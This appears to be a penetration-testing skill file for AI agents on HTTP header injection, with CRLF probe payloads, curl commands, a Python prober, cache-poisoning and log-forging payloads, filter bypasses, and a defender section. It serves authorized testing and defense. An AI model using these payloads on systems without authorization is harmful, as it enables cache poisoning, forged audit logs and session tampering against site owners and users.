---
name: header-injection
description: Use when testing for HTTP header injection and response
  splitting on an authorized web assessment. Covers CRLF injection in
  reflected headers, cache poisoning via headers, log injection, and
  request smuggling adjacencies. Also use when user input lands in
  redirects, cookies, or custom response headers.
version: 1.0.0
domain: web
lifecycle: stable
last_verified: "2026-10-23"
requires: []
extends: []
relates: [web-sqli, web-xss, http-request-smuggling, cache-poisoning]
tools:
  - name: Python
    version: "3.12"
  - name: Burp Suite
    version: "2026.2"
  - name: curl
    version: "8.5"
---

Header injection happens when user input is copied into an HTTP
response header without neutralizing carriage return and line feed
characters, letting an attacker inject new headers or split the
response. This skill covers authorized testing: finding reflection
points, proving injection safely, and checking the adjacent impacts
(cache poisoning, log injection). Test only systems you have written
permission to assess.

## Quick Workflow

1. Map every place user input reaches a response header: redirects,
   cookies, content disposition, and custom headers.
2. Probe with encoded CRLF sequences and watch the raw response.
3. Confirm with a harmless injected header (X-Probe) before trying
   anything with impact.
4. Test cache impact: does the injected response get cached for
   others.
5. Check log injection where input lands in logs.
6. Verify the framework's protections and where they are bypassed.
7. Document the exact request that injects and the injected bytes.
8. Recommend output encoding at the header sink.

## 1. Detection probes

```bash
# Probe a redirect parameter with encoded CRLF (raw response inspection)
curl -s -i 'https://target.example/redirect?to=%2Fhome%0D%0AX-Probe%3A+injected' \
  | head -20
# Look for: X-Probe: injected appearing as a real response header
```

```bash
# Cookie value reflection probe
curl -s -i --cookie 'theme=dark%0D%0AX-Probe%3A+injected' \
  'https://target.example/' | head -20
```

```python
#!/usr/bin/env python3
"""Header injection prober: tests parameters and reports reflections."""
import urllib.request

BASE = "https://target.example"
PAYLOAD = "%0D%0AX-Probe%3A+injected"
TARGETS = ["/redirect?to=/home", "/download?file=report.pdf", "/lang?set=en"]

for t in TARGETS:
    url = BASE + t + PAYLOAD
    req = urllib.request.Request(url, headers={"User-Agent": "probe"})
    with urllib.request.urlopen(req, timeout=15) as r:
        headers = dict(r.getheaders())
    hit = "X-Probe" in headers
    print(f"[{'HIT' if hit else 'clean'}] {t}")
```

## 2. Impact checks

```bash
# Cache poisoning adjacency: if the app caches, an injected header can
# poison the cached copy served to others (test with a cache buster)
curl -s -i 'https://target.example/redirect?to=%2Fhome%0D%0AX-Probe%3A+pwned&cb=12345' | head -12
# Then request again with a different cache buster and compare
```

```bash
# Log injection: input reflected into logs can forge log entries
curl -s 'https://target.example/login' \
  -H 'User-Agent: legit%0A[2026-10-23] ADMIN login succeeded from 10.0.0.1' \
  -o /dev/null
# Verify in your own test log view that the forged line appears as a real entry
```

## Edge cases

- The framework strips CR and LF but not other control characters.
  Test vertical tab and other smuggling bytes where relevant.
- Injection works but the response is not cacheable. Impact drops to
  session level; report honestly.
- Double encoding bypasses a naive filter. Test %250D%250A where the
  app decodes twice.
- The header sink is in a reverse proxy, not the app. Test through
  the full stack, since the proxy may normalize differently.

## Escalation

- Harmless header confirmed: escalate to cache poisoning only with
  authorization, using a canary marker, and purge after.
- Filter blocks CRLF: try header specific tricks like cookie
  attribute injection (`; Secure` vs `; Domain=evil`) which needs no
  CRLF.
- No reflection found: move on; log injection via User-Agent is worth
  one probe but rarely a finding alone.

## Detection and defender view

Defenders see header injection as requests with %0D%0A or raw CRLF in
parameters, sudden custom headers in responses, and forged lines in
logs. Detect with WAF rules on CRLF sequences in input and response
header anomaly alerts. The durable fix is framework level: reject or
encode CR and LF at every header sink, and treat log input as
untrusted data.

## Key references

- CWE-113 (Improper Neutralization of CRLF Sequences in HTTP Headers).
- CWE-117 (Improper Output Neutralization for Logs).
- MITRE ATT&CK T1190 (Exploit Public-Facing Application).
- OWASP Testing Guide: Testing for HTTP Splitting/Smuggling.
